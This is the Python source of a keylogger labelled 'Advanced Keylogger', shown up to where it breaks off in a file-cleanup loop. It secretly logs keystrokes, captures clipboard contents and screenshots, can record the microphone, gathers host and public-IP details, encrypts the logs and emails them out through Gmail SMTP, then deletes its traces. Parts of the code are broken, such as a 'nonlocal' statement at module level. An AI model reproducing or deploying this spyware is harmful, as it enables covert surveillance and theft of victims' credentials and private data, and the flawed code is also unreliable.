# keylogger.py
# Advanced Keylogger in Python

# Importing Libraries
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib
import socket
import platform
import win32clipboard
from pynput.keyboard import Key, Listener
import time
import os
from scipy.io.wavfile import write
import sounddevice as sd
from cryptography.fernet import Fernet
import getpass
from requests import get
from multiprocessing import Process, freeze_support
from PIL import ImageGrab

# Information file names
key_log_file = "key_log.txt"
system_info_file = "system_info.txt"
clipboard_file = "clipboard.txt"
audio_file = "audio_recording.wav"
screenshot_file = "screenshot.png"

encrypted_key_log = "encrypted_key_log.txt"
encrypted_system_info = "encrypted_system_info.txt"
encrypted_clipboard = "encrypted_clipboard.txt"

# Settings
mic_record_duration = 10
interval_time = 15
max_iterations = 3

# Email credentials
email_sender = " "  # Enter disposable email
email_password = " "  # Enter email password

user_name = getpass.getuser()
email_recipient = " "  # Enter recipient email address
encryption_key = " "  # Encryption key for encrypting files

file_directory = " "  # Path where files will be saved
separator = "\\"
merged_path = file_directory + separator

# Function to send emails
def send_email(file_name, attachment_path, recipient):
    msg = MIMEMultipart()
    msg['From'] = email_sender
    msg['To'] = recipient
    msg['Subject'] = "Log File"

    msg.attach(MIMEText("Please find the attached log file.", 'plain'))

    with open(attachment_path, 'rb') as attachment:
        payload = MIMEBase('application', 'octet-stream')
        payload.set_payload(attachment.read())
        encoders.encode_base64(payload)
        payload.add_header('Content-Disposition', f"attachment; filename={file_name}")
        msg.attach(payload)

    smtp_server = smtplib.SMTP('smtp.gmail.com', 587)
    smtp_server.starttls()
    smtp_server.login(email_sender, email_password)
    smtp_server.sendmail(email_sender, recipient, msg.as_string())
    smtp_server.quit()

# Sending key logs
send_email(key_log_file, merged_path + key_log_file, email_recipient)

# Function to get system information
def gather_system_info():
    with open(merged_path + system_info_file, "a") as sys_file:
        hostname = socket.gethostname()
        IP_address = socket.gethostbyname(hostname)
        try:
            public_IP = get("https://api.ipify.org").text
            sys_file.write("Public IP Address: " + public_IP + "\n")
        except Exception:
            sys_file.write("Could not retrieve public IP address.\n")

        sys_file.write(f"Processor: {platform.processor()}\n")
        sys_file.write(f"System: {platform.system()} {platform.version()}\n")
        sys_file.write(f"Machine: {platform.machine()}\n")
        sys_file.write(f"Hostname: {hostname}\n")
        sys_file.write(f"Private IP Address: {IP_address}\n")

# Collect system info
gather_system_info()

# Function to capture clipboard content
def capture_clipboard():
    with open(merged_path + clipboard_file, "a") as clip_file:
        try:
            win32clipboard.OpenClipboard()
            clipboard_data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
            clip_file.write("Clipboard Data: \n" + clipboard_data + "\n")
        except:
            clip_file.write("Could not capture clipboard data.\n")

# Capture clipboard data
capture_clipboard()

# Function to record audio using microphone
def record_audio():
    sample_rate = 44100
    duration = mic_record_duration
    audio_recording = sd.rec(int(duration * sample_rate), samplerate=sample_rate, channels=2)
    sd.wait()
    write(merged_path + audio_file, sample_rate, audio_recording)

# Function to take screenshot
def capture_screenshot():
    screenshot = ImageGrab.grab()
    screenshot.save(merged_path + screenshot_file)

# Capture screenshot
capture_screenshot()

# Keylogger and Timer
iterations = 0
start_time = time.time()
end_time = time.time() + interval_time

while iterations < max_iterations:
    key_count = 0
    key_list = []

    def on_key_press(key):
        nonlocal key_count
        print(key)
        key_list.append(key)
        key_count += 1
        if key_count >= 1:
            key_count = 0
            log_keys(key_list)
            key_list.clear()

    def log_keys(keys):
        with open(merged_path + key_log_file, "a") as key_log:
            for key in keys:
                key_str = str(key).replace("'", "")
                if key_str.find("space") > 0:
                    key_log.write('\n')
                elif key_str.find("Key") == -1:
                    key_log.write(key_str)

    def on_key_release(key):
        if key == Key.esc or time.time() > end_time:
            return False

    with Listener(on_press=on_key_press, on_release=on_key_release) as key_listener:
        key_listener.join()

    if time.time() > end_time:
        with open(merged_path + key_log_file, "w") as clear_log:
            clear_log.write(" ")

        capture_screenshot()
        send_email(screenshot_file, merged_path + screenshot_file, email_recipient)

        capture_clipboard()

        iterations += 1
        start_time = time.time()
        end_time = time.time() + interval_time

# Encrypt files
files_to_encrypt = [merged_path + system_info_file, merged_path + clipboard_file, merged_path + key_log_file]
encrypted_files = [merged_path + encrypted_system_info, merged_path + encrypted_clipboard, merged_path + encrypted_key_log]

for i, file_to_encrypt in enumerate(files_to_encrypt):
    with open(file_to_encrypt, 'rb') as file_data:
        data = file_data.read()

    fernet = Fernet(encryption_key)
    encrypted_data = fernet.encrypt(data)

    with open(encrypted_files[i], 'wb') as encrypted_file:
        encrypted_file.write(encrypted_data)

    send_email(encrypted_files[i], encrypted_files[i], email_recipient)

# Clean up the generated files
files_to_remove = [system_info_file, clipboard_file, key_log_file, screenshot_file, audio_file]
for file in files_to_remove:
   
